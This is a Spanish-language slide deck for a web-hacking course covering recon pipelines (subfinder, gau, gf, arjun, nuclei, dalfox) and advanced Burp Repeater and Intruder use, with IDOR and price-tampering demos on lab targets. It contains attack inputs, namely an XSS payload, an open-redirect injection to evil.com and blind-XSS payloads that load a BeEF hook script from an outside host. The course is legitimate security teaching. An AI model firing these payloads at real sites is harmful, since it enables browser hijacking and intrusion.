# Deck — Clase 1 · Módulo 3

> Curso de Web Hacking
> Duración: 2 horas
> Formato: teoría + demos guiadas

---

# Web Hacking
## Módulo 3 — Clase 1
### Recon Activo + Burp Suite Avanzado

---

## Recap: Lo que ya sabemos de Burp

**Módulo 2, Clase 2:**
- Burp como proxy interceptor (Man-in-the-Middle)
- Configuración: proxy en navegador + certificado CA
- **Proxy**: interceptar y modificar tráfico
- **Repeater**: reenviar requests manualmente
- **Intruder**: automatizar ataques (Sniper, Pitchfork, Cluster Bomb)
- **Target**: definir scope del análisis

> Hoy llevamos Burp al siguiente nivel: técnicas avanzadas de explotación manual.

---

## ¿Por qué "avanzado"?

Ya no nos limitamos a **interceptar** tráfico.

Ahora vamos a:
- **Validar hipótesis** de seguridad con Repeater
- **Fuzzear automáticamente** con Intruder (más allá de SQLi)
- **Extender capacidades** con el BApp Store
- **Manipular parámetros** para romper lógica de negocio
- **Analizar controles de acceso** (IDOR, bypass de autorización)

**El objetivo:** No solo "encontrar vulnerabilidades", sino **entender el comportamiento del sistema**.

---

## Agenda de hoy

| Bloque | Contenido | Tiempo aprox. |
|---|---|---|
| **0** | Recon activo: pipeline de herramientas | ~35 min |
| 🧪 | Demo 0: pipeline completo sobre target | ~10 min |
| **1** | Repeater avanzado: validación controlada | ~20 min |
| 🧪 | Demo 1: IDOR con Repeater | ~15 min |
| **2** | Intruder: fuzzing automático eficiente | ~20 min |
| 🧪 | Demo 2: Fuzzing de parámetros con Intruder | ~10 min |
| **3** | Extensiones y lógica de negocio | ~10 min |

---

## Recon Activo — Encontrar Superficie de Ataque

Antes de explotar, hay que **saber qué atacar**.

El recon activo con herramientas CLI permite:
- Descubrir **subdominios y hosts activos**
- Recolectar **URLs históricas y presentes**
- Filtrar parámetros con **patrones vulnerables**
- Detectar XSS y SQLi de forma **semi-automática**

> **Principio clave:** más superficie descubierta = más vectores potenciales.

---

## El Pipeline de Recon

```
subfinder  ──►  httpx-toolkit  (descubrir y filtrar hosts vivos)
                  │
          gau + katana          (recolectar URLs históricas + activas)
                  │
                uro              (deduplicar patrones)
                  │
     ffuf + gf + arjun          (fuzzing de rutas + filtrar params + descubrir ocultos)
                  │
    nuclei + kxss + bxss        (verificar vulnerabilidades)
                  │
            Burp Suite          (explotación y validación manual)
```

---

## subfinder — Enumeración de Subdominios

**¿Qué hace?** Encuentra subdominios de forma **pasiva** — sin tocar el target directamente.

```bash
# Básico
subfinder -d target.com -o subdomains.txt

# Con todas las fuentes disponibles
subfinder -d target.com -all -v -o subdomains.txt
```

**Output:**
```
api.target.com
admin.target.com
staging.target.com
dev.target.com
```

> Pasivo = consulta fuentes públicas (Shodan, VirusTotal, crt.sh, DNS). No genera tráfico al target.

---

## httpx-toolkit — ¿Cuáles responden?

**¿Qué hace?** Prueba cada subdominio y filtra los que responden HTTP/HTTPS.

> 📦 En Kali: el binario se llama `httpx-toolkit` (⚠️ `httpx` en Kali es el cliente Python, no ProjectDiscovery)

```bash
# Probe básico
cat subdomains.txt | httpx-toolkit -o live.txt          # Kali
cat subdomains.txt | httpx-toolkit -o live.txt             # Kali y Mac

# Con status code, título y tecnología detectada
cat subdomains.txt | httpx-toolkit -status-code -title -tech-detect -o live.txt
```

**Output:**
```
https://api.target.com       [200] [API Gateway]   [nginx]
https://admin.target.com     [302] [Admin Panel]   [apache]
https://staging.target.com   [200] [Staging]       [express]
```

> `httpx-toolkit` descarta hosts muertos y agrega contexto para **priorizar** qué atacar primero.

---

## gau + katana — Recolección de URLs

**gau** extrae URLs históricas desde Wayback Machine, Common Crawl y AlienVault.

```bash
gau target.com --threads 5 --o urls_historicas.txt
```

**katana** es un crawler activo — sigue links en tiempo real, descubre endpoints dinámicos.

```bash
# Crawl con profundidad 3
katana -u https://target.com -d 3 -o urls_activas.txt

# Con JS parsing (para SPAs)
katana -u https://target.com -jc -o urls_activas.txt
```

```bash
# Combinar ambas fuentes
cat urls_historicas.txt urls_activas.txt | sort -u > all_urls.txt
```

---
## waybackurls — URLs del Archivo Web

**waybackurls** extrae todas las URLs que el **Wayback Machine** tiene registradas para un dominio.

```bash
# Básico
echo "target.com" | waybackurls -o wayback.txt

# Lista de dominios
cat subdomains.txt | waybackurls -o wayback.txt

# Solo URLs con parámetros
echo "target.com" | waybackurls | grep "?"
```

**¿Qué diferencia tiene con gau?**

| | gau | waybackurls |
|---|---|---|
| **Fuentes** | Wayback + CommonCrawl + AlienVault | Solo Wayback Machine |
| **Velocidad** | Más lento (más fuentes) | Más rápido |
| **Uso típico** | Cobertura máxima | Pipeline rápido |

```bash
# Combinar ambas para máxima cobertura
cat subdomains.txt | gau --threads 5 > urls_gau.txt
cat subdomains.txt | waybackurls    > urls_wb.txt
cat urls_gau.txt urls_wb.txt | sort -u > all_urls.txt
```

> En el pipeline rápido: `echo target.com | waybackurls | gf xss | uro | ...`
---

## jsleak — Secretos y Links en JS

**¿Qué hace?** Analiza archivos JavaScript en busca de endpoints ocultos y secretos/credenciales hardcodeadas.

```bash
# Extraer links + secrets de todos los JS encontrados por katana
cat katana.txt | jsleak -l -s

# Solo endpoints
cat katana.txt | jsleak -l -c 20

# Solo secrets (API keys, tokens, passwords)
cat katana.txt | jsleak -s

# Contra un archivo JS específico
echo "https://target.com/main.js" | jsleak -l -s
```

**Output típico:**
```
[LINK]   /api/v1/users
[LINK]   /rest/products/search
[SECRET] apiKey: "AIzaSyD..."
[SECRET] password: "admin123"
```

> Combinar con katana: `katana -u target.com -jc -silent | jsleak -l -s`

---

## lazyegg — Extracción Completa desde JS

**¿Qué hace?** Extrae links, cookies, forms, JS URLs, localStorage, IPs y **credenciales filtradas** desde una URL o archivo JS.

```bash
# Extracción completa desde una URL
python3 /opt/lazyegg/lazyegg.py https://target.com --links --js_urls --leaked_creds

# Solo credenciales y localStorage (lo más jugoso)
python3 /opt/lazyegg/lazyegg.py https://target.com --leaked_creds --local_storage

# Escanear un archivo JS directamente
python3 /opt/lazyegg/lazyegg.py https://target.com/app.js --js_scan

# Con header de autenticación
python3 /opt/lazyegg/lazyegg.py https://target.com -H "Authorization: Bearer TOKEN" --leaked_creds
```

**vs jsleak:**

| | jsleak | lazyegg |
|---|---|---|
| **Input** | stdin (pipe-friendly) | URL directa |
| **Foco** | Links + secrets en JS | Extracción completa (forms, cookies, localStorage) |
| **Pipeline** | ✅ | ❌ |
| **Auth support** | ❌ | ✅ |

> Pipeline JS recon: `katana -u target.com -jc -silent | jsleak -l -s | sort -u`

---

## uro — Deduplicación de URLs

**El problema:** gau + katana generan miles de URLs con el mismo patrón:

```
/product?id=1
/product?id=2
/product?id=3   ← mismo parámetro, valor distinto → ruido puro
```

**uro** filtra dejando un solo representante por patrón:

```bash
cat all_urls.txt | uro -o urls_clean.txt
```

**Resultado:** de 10,000 URLs → ~500 patrones únicos.

> Solo necesitás **un representante por patrón** para testear el parámetro. El resto es ruido.

---
## qsreplace — Inyección Masiva de Payloads

**qsreplace** reemplaza el valor de **todos los parámetros** de una URL con el string que le pases.

```bash
# Básico — reemplazar todos los valores
echo "https://target.com/search?q=test&page=1" | qsreplace 'XSS_TEST'
# → https://target.com/search?q=XSS_TEST&page=XSS_TEST

# Inyectar payload XSS
cat xss_candidates.txt | qsreplace '"><svg onload=confirm(1)>'

# Inyectar para SQLi
cat sqli_candidates.txt | qsreplace "'"

# Inyectar para Open Redirect
cat redirect_candidates.txt | qsreplace 'https://evil.com'
```

**¿Por qué va después de uro?**

```bash
# Flujo correcto
cat urls.txt | uro                           # 1. deduplicar patrones
              | qsreplace 'PAYLOAD'          # 2. inyectar en cada patrón único
              | httpx-toolkit -silent        # 3. verificar que responden
```

> uro reduce el ruido → qsreplace inyecta el payload → la siguiente tool verifica el resultado.
---

## gf — Filtrado por Patrones Vulnerables

**gf** aplica patrones grep sobre URLs para clasificar posibles vulnerabilidades.

```bash
# XSS — parámetros típicos: q=, search=, input=, redirect=
cat urls_clean.txt | gf xss > candidates_xss.txt

# SQLi — parámetros típicos: id=, user=, cat=, page=
cat urls_clean.txt | gf sqli > candidates_sqli.txt

# Open redirect
cat urls_clean.txt | gf redirect > candidates_redirect.txt

# SSRF, RCE, LFI
cat urls_clean.txt | gf ssrf > candidates_ssrf.txt
cat urls_clean.txt | gf rce  > candidates_rce.txt
cat urls_clean.txt | gf lfi  > candidates_lfi.txt
```

> gf **no confirma** vulnerabilidades — **prioriza** qué revisar primero.

---

## arjun — Parámetros Ocultos

**El problema:** muchos endpoints tienen parámetros no documentados que no aparecen en las URLs:

```
GET /search          ← ¿existe ?debug= ?admin= ?format= ?callback= ?
```

**arjun** los descubre por fuerza bruta inteligente:

```bash
# Un endpoint específico
arjun -u https://target.com/search

# Múltiples endpoints
arjun -i candidates_xss.txt --rate-limit 10 -o params_found.txt
```

**Output:**
```
[+] https://target.com/search
    | debug
    | format
    | callback
```

> Parámetros ocultos = superficie de ataque **no auditada** por otros scanners.

---

## ffuf — Fuzzing de Directorios y Parámetros

**Fuzz Faster U Fool** — el fuzzer más rápido del ecosistema Go.

```bash
# Directory/file discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Filtrar respuestas vacías (ignorar 404)
ffuf -u https://target.com/FUZZ -w common.txt -fc 404

# Fuzzing de parámetros GET
ffuf -u https://target.com/search?FUZZ=test -w params.txt -mc 200

# Fuzzing de valor de parámetro
ffuf -u https://target.com/user?id=FUZZ -w ids.txt -fc 404

# Virtual host discovery
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200
```

| Modo | Uso |
|---|---|
| **Path fuzzing** | Descubrir rutas ocultas (`/admin`, `/backup`, `/api/v2`) |
| **Param fuzzing** | Encontrar parámetros que cambian el comportamiento |
| **Value fuzzing** | IDOR, SQLi, LFI sobre un parámetro conocido |
| **VHost fuzzing** | Subdominios no publicados en DNS |

> Wordlists recomendadas: `SecLists/Discovery/` (Daniel Miessler)

---

## kxss + bxss — Detección de XSS

**kxss** detecta qué parámetros **reflejan** caracteres especiales sin sanitizar.

```bash
cat candidates_xss.txt | kxss
```

**Output:**
```
[XSS] https://target.com/search?q=FUZZ   chars reflejados: < > " '
```

**bxss** inyecta payloads de **Blind XSS** — para XSS que se ejecutan en paneles admin invisibles.

```bash
cat candidates_xss.txt | bxss \
  -payload '"><script src=https://beef.labs.manuel-roldan.cloud/hook.js><\/script>' \
  -parameters
```

| Herramienta | Tipo de XSS detectado |
|---|---|
| **kxss** | Reflected (reflexión inmediata) |
| **bxss** | Blind (se ejecuta fuera de tu vista) |

---

## Gxss — Reflexión en Contextos JavaScript

**Gxss** detecta XSS reflejado con foco en **contextos JS** — más preciso que kxss para apps modernas.

```bash
# Parámetro individual
echo "https://target.com/search?q=test" | Gxss -p q

# Desde lista de URLs
cat candidates_xss.txt | Gxss -p q,search,input

# Con threads
cat candidates_xss.txt | Gxss -p q -c 50
```

**¿Por qué usarlo además de kxss?**

| | kxss | Gxss |
|---|---|---|
| **Detecta** | Caracteres reflejados sin encode | Reflexión dentro de contexto JS |
| **Mejor para** | HTML clásico | SPAs, apps con JS |
| **Output** | URL + chars | URL + contexto exacto |

```bash
# Pipeline: kxss para filtrado inicial → Gxss para validar contexto
cat urls.txt | kxss | grep "FUZZ" | Gxss -p q
```

---

## dalfox — XSS Scanner Automatizado

**dalfox** es el scanner de XSS más completo del ecosistema Go. Analiza, genera payloads y explota.

```bash
# Scan básico de una URL
dalfox url "https://target.com/search?q=test"

# Desde lista de URLs
dalfox file candidates_xss.txt

# Con Blind XSS (BeEF hook)
dalfox url "https://target.com/search?q=test" \
  --blind https://beef.labs.manuel-roldan.cloud/hook.js

# Solo parámetros específicos
dalfox url "https://target.com/page?id=1&q=test" -p q

# Output silencioso (solo hallazgos)
dalfox file urls.txt --silence
```

**Ventajas sobre kxss/Gxss:**
- Genera y **verifica** payloads automáticamente
- Detecta **DOM XSS** con headless Chrome
- Integra con **BeEF** para Blind XSS
- Reportes en JSON: `--format json -o results.json`

> dalfox confirma la vulnerabilidad, no solo detecta reflexión.

---

## nuclei — Escaneo con Templates

**nuclei** ejecuta templates de vulnerabilidades conocidas contra una lista de hosts.

```bash
# Templates básicos
nuclei -l live.txt -t exposures/ -t vulnerabilities/ -o results.txt

# Solo severidad alta/crítica
nuclei -l live.txt -severity high,critical -o critical.txt

# XSS y SQLi específicamente
nuclei -l live.txt -tags xss,sqli -o xss_sqli.txt
```

**¿Qué detecta?**
- Paneles expuestos (admin, phpMyAdmin, Jenkins, Grafana)
- CVEs conocidos
- Configuraciones inseguras
- XSS y SQLi con templates específicos

> nuclei es rápido pero genera **falsos positivos**. Siempre validar con Burp.

---

## 🧪 Demo 0 — Pipeline Completo

**Target:** `dvwa.labs.manuel-roldan.cloud`

```bash
# 1. Crawl del target
katana -u https://dvwa.labs.manuel-roldan.cloud -d 2 -o urls.txt

# 2. Deduplicar
cat urls.txt | uro -o clean.txt

# 3. Filtrar candidatos
cat clean.txt | gf xss  > xss.txt
cat clean.txt | gf sqli > sqli.txt

# 4. Detectar reflexión XSS
cat xss.txt | kxss

# 5. Buscar parámetros ocultos
arjun -i clean.txt --rate-limit 5 -o params.txt

# 6. Escanear con nuclei
nuclei -l clean.txt -tags xss,sqli -severity medium,high
```

**Resultado:** lista priorizada de candidatos → exportar a Burp para explotación manual.

---

## Conectar el Recon con Burp

El pipeline automatiza el **descubrimiento**. Burp hace la **explotación y validación**.

| Output del pipeline | Acción en Burp |
|---|---|
| URLs con parámetros (gf) | Importar a **Target → Site Map** |
| Parámetros ocultos (arjun) | Agregar a requests en **Repeater** |
| Candidatos XSS (kxss) | Confirmar y explotar con **Repeater** |
| Lista de hosts (httpx-toolkit) | Definir **Scope** en Target |
| Candidatos SQLi (gf sqli) | Fuzzear con **Intruder** |

```bash
# Exportar targets para importar en Burp
cat candidates_xss.txt candidates_sqli.txt | sort -u > burp_targets.txt
```

---

## Enfoque Avanzado del Análisis de Seguridad

Las técnicas avanzadas de explotación manual se centran en evaluar cómo responde una aplicación web ante **interacciones no previstas**, manteniendo siempre el control del proceso y el análisis contextual de cada respuesta.

**A este nivel, el objetivo del analista no es únicamente identificar vulnerabilidades técnicas, sino:**
- Confirmar fallos de **autorización**
- Detectar errores de **lógica de negocio**
- Evaluar la robustez de los **controles de sesión**
- Analizar la **coherencia de las respuestas** del servidor

> Burp Suite Community Edition, aunque limitada en automatización, permite un análisis profundo mediante el uso combinado de Repeater, Intruder y extensiones.

---

## Repeater: Más Allá del "Send"

**Ya sabemos que Repeater permite reenviar requests.**

¿Para qué lo usan los pentesters profesionales?

**Repeater como herramienta de validación controlada:**
- Validar **hipótesis** de seguridad de forma precisa
- Cada solicitud debe ser evaluada de forma **independiente**
- La **autenticación NO implica autorización**
- El servidor debe **validar cada acción** solicitada

Repeater es especialmente útil para analizar **controles de acceso**, ya que permite repetir solicitudes legítimas con valores alterados **sin depender del flujo normal de la aplicación**.

---

## Repeater: Casos de Uso Avanzados

| Caso | Qué buscamos |
|------|-------------|
| **Pruebas de autenticación y sesión** | ¿El token es validado en cada request? |
| **Control de acceso e IDOR** | ¿Puedo acceder a datos de otro usuario cambiando un ID? |
| **Manipulación de parámetros** | ¿Puedo alterar `price`, `role`, `quantity`? |
| **Validación de lógica de negocio** | ¿Qué pasa si cambio el orden de las acciones? |
| **Análisis de validaciones server-side** | ¿El servidor revalida o confía en el cliente? |

> La clave: cada request se envía con **intención**, no por fuerza bruta.

---

## Repeater: Flujo de Trabajo

1. **Interceptar una solicitud válida**  
   Capturar una request real desde el navegador (login, acción, API, etc.)

2. **Enviar la solicitud a Repeater**  
   Esto permite trabajar sobre una copia, sin afectar la navegación normal

3. **Modificar valores manualmente**  
   Parámetros, headers, cookies, IDs, métodos HTTP

4. **Reenviar la solicitud múltiples veces**  
   Cada cambio permite observar:
   - Cambios en la respuesta
   - Mensajes de error
   - Códigos de estado
   - Diferencias sutiles en el comportamiento

5. **Comparar respuestas**  
   La comparación entre requests casi idénticas suele revelar fallos de control

---

## Repeater: Fuzzing Manual

Repeater se usa frecuentemente para **fuzzing manual**, una técnica de descubrimiento basada en **calidad de análisis**, no en cantidad de requests.

**El fuzzing manual consiste en:**
- Elegir un parámetro concreto
- Enviar múltiples valores controlados
- Observar respuestas anómalas o inconsistentes

**A diferencia del fuzzing automático:**
- No genera miles de requests
- No busca cobertura masiva
- Prioriza **comprensión del sistema**

---

## ¿Por qué Repeater es tan importante?

Porque permite:
- Repetir **exactamente** la misma request
- Cambiar **una sola variable** a la vez
- Eliminar ruido del análisis
- Validar hipótesis técnicas

> En muchos casos, una vulnerabilidad **lógica** solo se detecta con este tipo de análisis manual.

---

## 🧪 Demo guiada 1 — IDOR con Repeater

**Target:** WebGoat → Access Control Flaws → Insecure Direct Object References

**Escenario:** Una aplicación permite ver perfiles de usuarios mediante `GET /profile?id=123`

**Pasos:**
1. Interceptar la request válida (tu propio perfil)
2. Send to Repeater
3. Modificar el parámetro `id` a valores diferentes (121, 122, 124, etc.)
4. Comparar respuestas:
   - ¿Cambia el contenido?
   - ¿Ves datos de otro usuario?
   - ¿Hay diferencias en el código HTTP?
5. Documentar el IDOR si existe

**Objetivo:** Confirmar si el servidor valida autorización o confía en el parámetro.

---

## Intruder: Fuzzing Automático

**Intruder** es una herramienta de Burp Suite diseñada para **automatizar ataques repetitivos** sobre solicitudes HTTP.

Es especialmente útil para hacer **fuzzing** (probar muchas variantes de entrada) de forma rápida y controlada, sin necesidad de modificar parámetros manualmente uno por uno.

**Flujo:**
1. Seleccionar una request objetivo
2. Marcar los puntos donde se quiere inyectar contenido (**positions**)
3. Ejecutar cientos o miles de pruebas en pocos minutos
4. Comparar las respuestas para detectar comportamientos anómalos

---

## Intruder: ¿Qué se puede fuzzear?

- **Parámetros en URL** (query string)
- **Campos de formularios** (POST)
- **Cuerpos JSON** (valores específicos dentro del payload)
- **Cookies de sesión**
- **Headers** (por ejemplo `Authorization`, `User-Agent`, `X-Forwarded-For`)
- **Partes del path o rutas** (para descubrir endpoints ocultos)

**Ejemplo de fuzzing de headers:**
```http
GET /api/admin HTTP/1.1
Host: target.com
X-Forwarded-For: §127.0.0.1§
User-Agent: §Mozilla/5.0§
Authorization: Bearer §token123§
```

---

## Intruder: ¿Qué problemas detecta?

**Validaciones insuficientes o inconsistentes:**
- Filtros bypasseables con encoding
- Validaciones solo client-side

**Errores de control de acceso:**
- IDOR (Insecure Direct Object References)
- Permisos mal aplicados

**Endpoints internos o funcionalidades no documentadas:**
- APIs ocultas
- Rutas de admin no protegidas

**Manejo incorrecto de sesiones o tokens:**
- Tokens predecibles
- Session fixation

**Respuestas inesperadas:**
- Posibles vectores de inyección

---

## Intruder: Indicadores de Hallazgos

¿Cómo saber si se encontró algo?

| Indicador | Qué sugiere |
|-----------|-------------|
| **Cambios en código HTTP** | 200 vs 401 vs 403 vs 500 → comportamiento distinto |
| **Diferencias en tamaño** | Longitud de respuesta muy diferente → contenido distinto |
| **Mensajes de error** | Stack traces, errores SQL, excepciones |
| **Tiempos de respuesta anómalos** | Posible procesamiento interno (blind SQLi, SSRF) |
| **Contenido inesperado** | Datos sensibles, información de debug |

**Tip:** Ordenar resultados por Length, Status o Time en la tabla de Intruder.

---

## 🧪 Demo guiada 2 — Fuzzing de parámetros con Intruder

**Target:** Aplicación con endpoint `/checkout?product_id=X&quantity=Y&price=Z`

**Hipótesis:** El servidor confía en el parámetro `price` enviado por el cliente.

**Pasos:**
1. Interceptar la request legítima de compra
2. Send to Intruder
3. Marcar position en `price` → `price=§1000§`
4. En Payloads, usar **Numbers** (1-1000)
5. Ejecutar ataque
6. Analizar respuestas:
   - ¿Alguna acepta precio modificado?
   - ¿Hay diferencias en el código o respuesta?
7. Validar con Repeater si encontrás algo

**Objetivo:** Confirmar si el servidor recalcula el precio o confía en el cliente.

---

## Manipulación de Parámetros: Confianza Incorrecta en Datos del Cliente

Muchas aplicaciones web confían en que los valores enviados por el cliente **no serán alterados**. Esta suposición incorrecta da lugar a múltiples vulnerabilidades.

**Desde el punto de vista teórico, el analista debe evaluar:**
- ¿El servidor **recalcula** valores críticos?
- ¿Existen **validaciones de rango**?
- ¿Los parámetros están **vinculados al usuario autenticado**?

La modificación de parámetros GET y POST permite verificar si el servidor aplica **controles reales** o si confía en los datos recibidos desde el cliente.

---

## Ejemplo Práctico: E-commerce Inseguro

**Escenario:**
Una aplicación de e-commerce envía el **precio** de un producto como parámetro en una solicitud POST al momento de confirmar la compra.

```http
POST /checkout HTTP/1.1
...

producto_id=123&precio=1000
```

**Suposición insegura:**
El servidor confía en que el valor `precio` enviado por el cliente es legítimo y **no lo recalcula internamente**.

**Prueba conceptual:**
El analista modifica únicamente el valor del parámetro:

```http
producto_id=123&precio=10
```

---

## Comportamientos Posibles

**Comportamiento esperado (seguro):**
- El servidor **ignora** el valor enviado
- Recalcula el precio real en base al `producto_id` y al usuario autenticado
- Responde con el precio correcto

**Comportamiento vulnerable:**
- El servidor **acepta** el valor modificado
- Procesa la operación con el precio alterado
- El atacante compra un producto de $1000 por $10

**¿Cómo validar esto con Burp?**
1. Interceptar checkout legítimo
2. Send to Repeater
3. Modificar `precio` a 1
4. Enviar y analizar respuesta
5. Confirmar si la compra se procesó con el precio alterado

---

## Extensiones: BApp Store

Las extensiones amplían las capacidades de Burp Suite, permitiendo agregar funcionalidades que no están disponibles por defecto o mejorar flujos de análisis existentes.

**Acceso:**
- Pestaña **Extender** → **BApp Store**

**Tipos de extensiones:**
- **Java**: Extensiones compiladas como archivos `.jar`
- **Python**: Escritas en Jython (no Python nativo moderno)
- **Ruby**: Menos utilizadas, pero soportadas vía JRuby

---

## Extensiones Útiles para Web Hacking

| Extensión | Para qué sirve |
|-----------|---------------|
| **Active Scan++** | Amplía escaneo activo, detecta más vulnerabilidades |
| **JWT Scanner** | Analiza tokens JWT (algoritmos débiles, configuraciones inseguras) |
| **Logger++** | Registra tráfico HTTP avanzado, facilita análisis |
| **CSRF Scanner** | Detecta vulnerabilidades de Cross-Site Request Forgery |
| **XSS Validator** | Confirma XSS validando si payloads se ejecutan |
| **Bypass WAF** | Asiste en evadir Web Application Firewalls |
| **Autorize** | Prueba automática de controles de acceso (IDOR, permisos) |
| **JSON Beautifier** | Formatea JSON para lectura fácil |

**Instalación:** BApp Store → buscar extensión → Install

---

## Instalación Manual de Extensiones

Además del BApp Store, es posible cargar **extensiones locales**.

**Proceso general:**
1. Descargar el archivo `.jar`, `.py` o `.rb` del repositorio/autor
2. En Burp → Extender → Extensions → **Add**
3. Seleccionar tipo de extensión (Java, Python, Ruby)
4. Cargar el archivo descargado
5. Verificar que cargue sin errores

**Ejemplo:**
Cargar una extensión `.jar` descargada de un repositorio académico o GitHub.

**Consideraciones:**
- Algunas extensiones requieren dependencias adicionales
- Python requiere **Jython standalone JAR** configurado en Burp
- Verificar compatibilidad con la versión de Burp instalada

---

## Comparación: Repeater vs Intruder

| Aspecto | Repeater | Intruder |
|---------|----------|----------|
| **Objetivo** | Análisis fino, validar hipótesis | Fuzzing masivo, automatización |
| **Velocidad** | Manual, una request a la vez | Automático, cientos/miles de requests |
| **Control** | Total, modificas exactamente lo que querés | Define positions y payloads, Burp hace el resto |
| **Uso típico** | IDOR, lógica de negocio, sesiones | Brute force, fuzzing de parámetros, discovery |
| **Curva de aprendizaje** | Baja | Media (entender tipos de ataque) |
| **Análisis de resultados** | Visual, respuesta por respuesta | Tabla comparativa (Length, Status, Time) |

**¿Cuándo usar cada una?**
- **Repeater**: Cuando sabés qué estás buscando y querés control total
- **Intruder**: Cuando necesitás probar muchas variantes rápido

---

## Resumen de lo aprendido

- **Repeater avanzado**: Validación controlada, fuzzing manual, análisis de lógica de negocio
- **Intruder para fuzzing**: Automatizar ataques, detectar patrones en respuestas
- **Manipulación de parámetros**: Romper suposiciones inseguras del servidor
- **Extensiones**: BApp Store y carga manual para ampliar capacidades
- **Indicadores de hallazgos**: Códigos HTTP, tamaños, tiempos, contenido

---

## Próxima clase

**Módulo 3 — Clase 2:**
- Autenticación y sesiones: JWT, OAuth, tokens
- Session fixation, hijacking y CSRF avanzado
- Bypass de 2FA y rate limiting
- Automatización con Python + Burp API

---

## Gracias

**¿Preguntas?**

Recuerden: Burp no es un botón mágico.  
Es una herramienta que **amplifica** tu razonamiento.

Practiquen, experimenten, rompan cosas (en labs autorizados 😉)

Nos vemos la próxima clase 🚀
